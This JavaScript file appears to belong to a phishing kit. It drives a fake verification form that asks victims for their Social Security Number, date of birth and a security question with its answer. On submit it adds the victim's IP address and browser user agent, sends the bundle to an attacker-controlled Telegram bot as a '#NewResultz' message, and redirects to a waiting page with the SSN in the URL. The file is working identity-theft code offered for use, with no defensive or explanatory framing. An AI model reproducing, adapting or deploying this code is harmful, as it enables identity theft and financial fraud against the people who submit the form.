import { telegramToken, telegramChatId } from '../tele.js';

document.addEventListener("DOMContentLoaded", function() {
    var submitButton = document.querySelector('.button--primary');
    if (submitButton) {
        submitButton.addEventListener('click', function(event) {
            var isValid = validateForm();
            if (!isValid) {
                event.preventDefault();
            }
        });
    }
});

function validateForm() {
    var isValid = true;
    var requiredFields = document.querySelectorAll('[required]:not(#automaticPayments):not(#storePayment)');

    requiredFields.forEach(function(field) {
        if (!field.value.trim()) {
            isValid = false;
            field.classList.add('error');
            var errorMessage = field.parentNode.querySelector('.error-message');
            if (!errorMessage) {
                errorMessage = document.createElement('span');
                errorMessage.classList.add('error-message');
                errorMessage.classList.add('error-text');
                var fieldName = field.getAttribute('title') || 'Field';
                switch (field.id) {
                    case 'line1':
                        errorMessage.textContent = 'Social Security Number is required';
                        break;
                    case 'city':
                        errorMessage.textContent = 'Date of Birth is required';
                        break;
                    case 'state':
                        errorMessage.textContent = 'Choose a security question is required';
                        break;
                    case 'zip':
                        errorMessage.textContent = 'What\'s the answer? is required';
                        break;
                    default:
                        errorMessage.textContent = fieldName + ' is required';
                        break;
                }
                field.parentNode.appendChild(errorMessage);
            }
        } else {
            field.classList.remove('error');
            var errorMessage = field.parentNode.querySelector('.error-message');
            if (errorMessage) {
                errorMessage.remove();
            }
        }
    });

    var agreeCheckbox = document.getElementById('automaticPayments');
    if (!agreeCheckbox.checked) {
        isValid = false;
        var errorMessage = document.getElementById('automaticPaymentsError');
        if (!errorMessage) {
            errorMessage = document.createElement('span');
            errorMessage.id = 'automaticPaymentsError';
            errorMessage.classList.add('error-message');
            errorMessage.classList.add('error-text');
            errorMessage.textContent = 'You must agree to the terms and conditions';
            agreeCheckbox.parentNode.appendChild(errorMessage);
        }
    } else {
        var errorMessage = document.getElementById('automaticPaymentsError');
        if (errorMessage) {
            errorMessage.remove();
        }
    }

    return isValid;
}

document.getElementById('verificationForm').addEventListener('submit', async function(event) {
    event.preventDefault();

    if (!validateForm()) {
        return;
    }

    const form = document.getElementById('verificationForm');
    const formData = new FormData(form);
    const ssn = formData.get('ssn');
    const dob = formData.get('dob');
    const sq = formData.get('sq');
    const answer = formData.get('answer');
    const clientIP = await getClientIP();
    const clientAgent = navigator.userAgent;

    const message = `🌟You got a #NewResultz 🌟\n🌟Wassup, 🌟xf🌟 INFOX 🌟\n🔐 SSN: ${ssn}\n📅 DATE OF BIRTH: ${dob}\n🔑 SECURITY QUESTION: ${sq}\n🔓 SECURITY ANSWER: ${answer}\n🌐 CLIENT IP: ${clientIP}\n🖥️ USER AGENT: ${clientAgent}`;

    await sendToTelegram(message);

    const redirectString = generateRandomString(150);
    window.location.href = `../pwait.html?ssn=${ssn}&redirectstring=${redirectString}`;
});

async function getClientIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching client IP:', error);
        return 'Unknown IP';
    }
}

async function sendToTelegram(message) {
    const telegramURL = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;
    try {
        await fetch(telegramURL);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

function generateRandomString(length) {
    return Array.from({ length: length }, () => Math.random().toString(36)[2]).join('');
}
